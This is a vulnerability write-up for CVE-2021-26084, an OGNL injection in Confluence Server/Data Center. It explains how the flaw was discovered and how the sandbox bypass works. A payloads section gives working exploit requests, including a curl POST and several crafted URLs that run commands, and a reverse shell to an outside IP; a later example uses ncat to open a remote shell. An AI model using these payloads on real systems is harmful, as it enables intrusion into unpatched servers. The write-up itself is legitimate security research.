# CVE-2021-26084

# Introduction
This write-up provides an overview of CVE-2021-26084 - Confluence Server Webwork OGNL injection [[1]](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html) that would allow an authenticated user to execute arbitrary code on a Confluence Server or Data Center instance.

# TL;DR
Confluence Server / Data Center makes use of Webwork 2 MVC framework to process web requests and the view layer primarily consists of Velocity templates. A double evaluation is performed when velocity templates use Webwork tags with a value attribute that contains $. When a Webwork tag with a Value attribute that has a $ is encountered an initial evaluation happens in the parsing of Velocity template; this evaluated value is then passed to the Webwork tag which further evaluates the value as an OGNL expression. If the action class exposes a setter function for the parameter used in the value attribute then this parameter can be set from the URL by using URL params.. So by crafting a URL with an OGNL payload an attacker can perform remote code execution on the affected versions of the Confluence Server / Data Center.

# Payloads

```python
# UnAuthenticated RCE  - based on the awesome write-up  at httpvoid; courtesy of  Harsh Jaiswal(rootxharsh), Rahul Maini (iamnoooob) [8]
curl -i -s -k -X $'POST' -H $'Host: 127.0.0.1:8090' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 186' --data-binary $'linkCreation=a%5Cu0027%2B%23attr%5B%5Cu0022webwork.valueStack%5Cu0022%5D.findValue%28%5Cu0022%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0027xcalc%5Cu0027%29%5Cu0022%29%2B%5Cu0027' $'http://localhost:8090/pages/doenterpagevariables.action'

# UnAuthenticated RCE for Confluence < 7.12.14, Only if allow people to sign up to create their account' is enabled. COG > User Management > User Signup Options.
http://localhost:8090/signup.action?token=%5Cu0027%2B%28%23attr%5B%5Cu0022webwork.valueStack%5Cu0022%5D%29.%28findValue%28%5Cu0022%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu00
5C%5Cu0022xcalc%5Cu005C%5Cu0022%29%5Cu0022%29%29%2B%5Cu0027

# Authenticated RCE for Confluence < 7.12.14, a valid user account is required on the Confluence Server
http://localhost:8090/users/darkfeatures.action?featureKey=%5Cu0027%2B%28%23attr%5B%5Cu0022webwork.valueStack%5Cu0022%5D%29.%28findValue%28%5Cu0022%40java.lang.Runtime%40getRuntime%28
%29.exec%28%5Cu005C%5Cu0022xcalc%5Cu005C%5Cu0022%29%5Cu0022%29%29%2B%5Cu0027

# Authenticated RCE for for Confluence 7.12.14, the newSpaceKey parm is to be updated with the Space key of a space the user has Add Pages Permission
http://localhos:8090/pages/docreatepagefromtemplate.action?newSpaceKey=SAN&sourceTemplateId=uu%5Cu0027%2B%28%23attr%5B%5Cu0022webwork.valueStack%5Cu0022%5D%29.%28findValue%28%5Cu0022%
40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu005C%5Cu0022xcalc%5Cu005C%5Cu0022%29%5Cu0022%29%29%2B%5Cu0027

# The payload below spawns a reverse shell to a remote host running a netcat listener.BurpSuite addon Hackvertor tags has been used for readability and has to be converted accordingly
http://localhos:8090/pages/docreatepagefromtemplate.action?sourceTemplateId=oa<@urlencode_not_plus>\u0027+(#attr[\u0022webwork.valueStack\u0022]).(findValue(\u0022(#cmd=new
java.lang.String[]{\u0027/bin/bash\u0027,\u0027-c\u0027,\u0027<@unicode_escapes>exec 5<>/dev/tcp/35.224.37.217/8021;cat <&5 | while read line; do $line 2>&5 >&5;
done<@/unicode_escapes>\u0027}).(@java.lang.Runtime@getRuntime().exec(#cmd))\u0022))+\u0027<@/urlencode_not_plus>
```
# Expression Language Injection
Expression Language injection vulnerabilities arise when an application incorporates user-controllable data into a string that is dynamically evaluated by a code interpreter. If the user data is not strictly validated, an attacker can use crafted input to modify the code to be executed, and inject arbitrary code that will be executed by the server [[2]](https://portswigger.net/kb/issues/00100f20_expression-language-injection). Object-Graph Navigation Language (OGNL) [[3]](https://commons.apache.org/proper/commons-ognl/language-guide.html) is an expression language for handling Java objects. When an OGNL injection vulnerability is present, it is possible for the attacker to inject OGNL expressions that can then be used to execute arbitrary Java code. In addition to property getting/setting, OGNL supports many more features, of which the below seems to be interesting from an exploit development view-point

- Static method calling: @java.lang.Runtime@getRuntime()

- Constructor calling: new java.lang.String[]{'/bin/bash','-c', ‘xcalc’}

- Ability to work with context variables: #attr["webwork.valueStack"]

- Method calling: #attr["webwork.valueStack"].findValue()

Combining the above constructs a valid OGNL expression may be formed. A typical OGNL expression is shown below:

```sh
@java.lang.Runtime@getRuntime().exec('ncat 203.0.113.5 8021 -e /bin/bash')
```

# Webwork 2

WebWork 2 is a pull based MVC framework built on top of a command pattern framework API called XWork and is the predecessor of the popular Apache Struts2. Confluence uses OpenSymphony's WebWork 2 to process web requests submitted by users. Webwork supports a powerful Expression Language based on OGNL for navigating its object stack(a.k.a ValueStack). It also supports multiple view technologies including JSP, FreeMarker, Velocity and also provides a rich tag library. “WebWork: Strutting the OpenSymphony way” by Mike Cannon-Brookes [4] provides an excellent overview of the Webwork 2 framework. Among other things that is of particular interest to this vulnerability is Webwork’s support for:

- Automatically setting properties of action based on request parameters (URL params)
- View integration (Velocity)
- User interface / form components (Webwork tags) that process some of it’s attributes using OGNL

# Discovery
The detection of the vulnerability primarily involved a white box testing approach where source code instrumentation was used to analyze the OGNL evaluation. Following the excellent research of GHSL researcher Man Yue Mo on OGNL injection in Apache Struts [[5]](https://securitylab.github.com/research/apache-struts-double-evaluation/) [[6]](https://securitylab.github.com/research/ognl-injection-apache-struts/) [[7]](https://securitylab.github.com/research/apache-struts-CVE-2018-11776/) it has been noticed that the [evaluateParams](https://lgtm.com/projects/g/apache/struts/snapshot/218366b4cd0d8d165f505e8b9e6f3e6bf19d9aae/files/core/src/main/java/org/apache/struts2/components/UIBean.java#L637) method of the UIBean class served as an interesting candidate. The code base of the webwork library in the Confluence Data Center(atlassian-confluence-x.y.z/confluence/WEB-INF/lib/webwork-2.1.5-atlassian-3.jar) was extracted using JD GUI and was analysed for methods similar to evaluateParams. The closest match was protected void evaluateParams(OgnlValueStack stack) method in com.opensymphony.webwork.views.jsp.ui.AbstractUITag. Source code analysis further revealed that there exists a com.opensymphony.webwork.util.SafeExpressionUtil class that blocked the majority of the OGNL payloads.

As the author hardly had any expertise to run the Confluence Server through a debugger, primitive print statements were used to dump the results of the OGNL evaluation in the above classes. The steps involved in instrumenting the source code was:

1. Decompile the webwork-2.1.5-atlassian-3.jar using JD GUI.
2. Copy the AbstractUITag.java and the SafeExpressionUtil.java files into a temporary folder on the Confluence Server
3. Update the methods of interest with print statements that dumped the results to the stdout.

```javascript
String DL = "\n" + (new Exception().getStackTrace()[0]).getClassName() + "::" +  (new Exception().getStackTrace()[0]).getMethodName() + ":";
Object o = findValue(this.valueAttr, valueClazz);
addParameter("nameValue", o);
System.out.println("\033[1;33m" + DL + (new Exception().getStackTrace()[0]).getLineNumber() + "\t findValue( " + this.valueAttr + " ) = " + o + "\033[0m");
```
4. Compile the modified java files and inject them back to the webwork-2.1.5-atlassian-3.jar
```bash
# use javap on the classes inside webwork jar to identify the source and target versions
javac -target 1.6 -source 1.6 -classpath "/opt/atlassian-confluence-7.12.4/lib/*:/opt/atlassian-confluence-7.12.4/confluence/WEB-INF/lib/*" -d . *.java
jar vuf webwork-2.1.5-atlassian-3.jar com
```
5. Replace the webwork-2.1.5-atlassian-3.jar in the Confluence installation directory with the instrumented version
6. Run the Confluence server in the foreground and observe the console output.

With the instrumented webwork library in place it was observed that the value attribute of the webwork tags is a potential injection point as the rendering ended up in the evaluateParams method and the value attribute was evaluated as OGNL . It was also observed that if the velocity template had a webwork tag whose value attribute is set using the $ construct then this value was evaluated during the rendering of the velocity template and this evaluated value was passed to the Webwork tag. Typical example of such a tag is:

```javascript
#tag ("Hidden" "id=sourceTemplateId" "name='sourceTemplateId'" "value='${templateId}'")

#tag( "Hidden" "name='token'" "value='$!action.token'" )

#tag( "Component" "label='Enable dark feature:'" "name='featureKey'" "value='$!action.featureKey'" "theme='aui'" "template='text.vm'")
```
Though the value attribute was processing the input as OGNL there were single quotes around the $ construct causing the input to be treated as string. To circumvent this restriction Unicode escape sequence was used as passing in the single quotes directly resulted in it being converted to html entities prior to reaching the OGNL execution point. The Unicode escape sequence is parsed inside the OgnlUtil.compile and an ognl.ASTAdd is formed causing the injected Ognl payload to be evaluated .

```javascript
parsedExpression = OgnlUtil.compile( '\u0027+(7*7)+\u0027' ) = "" + (7 * 7) + ""

com.opensymphony.webwork.views.jsp.ui.AbstractUITag::evaluateParams --> findValue( '\u0027+(7*7)+\u0027' ) = 49
```
![confluence-ognl-injection-identification](https://user-images.githubusercontent.com/91962262/136057280-b23d58ba-e988-4011-a584-d8d486da2a5f.png)


The Confluence codebase was searched for velocity files matching a regex pattern that had a webwork tag and $ in it’s attribute. Once the velocity file was identified the corresponding action class that used the velocity template was identified by browsing through the xwork configuration file viz xwork.xml ( inside confluence-x.y.z.jar) . The process roughly looks like:

# Exploit
The content-editor.vm (atlassian-confluence-7.12.4/confluence/template/custom) had the below Webwork tag

```bash
#if ($templateApplied)
#tag ("Hidden" "id=sourceTemplateId" "name='sourceTemplateId'" "value='${templateId}'")
#end
```
The value attribute, templateId can be set by passing a URL param sourceTemplateId to the docreatepagefromtemplate.action endpoint. When a URL param with the name sourceTemplateId is called, the setter function of the action class (com.atlassian.confluence.pages.actions.CreatePageFromTemplateAction ) viz setSourceTemplateId is invoked by the framework and this sets the value of the sourceTemplateId member variable.

When the velocity template is parsed the ${templateId} is initially evaluated by calling the getTemplateId function of the action class that returns the value of the sourceTemplateId member variable.

![confluence-ognl-injection-source-analysis](https://user-images.githubusercontent.com/91962262/136057610-faca04c8-5f04-4a15-9c83-8f52c45b5e82.png)


This evaluated value is then passed to the Webwork tag's value attribute that then evaluates the value attribute as OGNL expression. Finally by using Unicode escape sequence and making use of the #attr["webwork.valueStack"] variable it is possible to bypass the SafeExpressionUtil sandbox used by the WebWork tags, and execute arbitrary java code.

![confluence-ognl-injection-payload-evaluation](https://user-images.githubusercontent.com/91962262/136057684-fae2a127-7f60-48bb-a7b7-243411647c6c.png)


# References

1. [Confluence Security Advisory - 2021-08-25](https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html)

2. [Expression Language injection](https://portswigger.net/kb/issues/00100f20_expression-language-injection)

3. [Apache Commons OGNL - Language Guide](https://commons.apache.org/proper/commons-ognl/language-guide.html)

4. [Strutting the OpenSymphony way](https://www.atlassian.com/blog/rebelutionary/misc/TSS-WebWork2.ppt)

5. [Apache Struts double evaluation RCE lottery. 4 Oct 2018](https://securitylab.github.com/research/apache-struts-double-evaluation/)

6. [OGNL injection in Apache Struts: Discovering exploits with taint tracking. 24 Sep 2018](https://securitylab.github.com/research/ognl-injection-apache-struts/)

7. [CVE-2018-11776: How to find 5 RCEs in Apache Struts with CodeQL](https://securitylab.github.com/research/apache-struts-CVE-2018-11776/)

8. [CVE-2021-26084 Remote Code Execution on Confluence Servers](https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md)
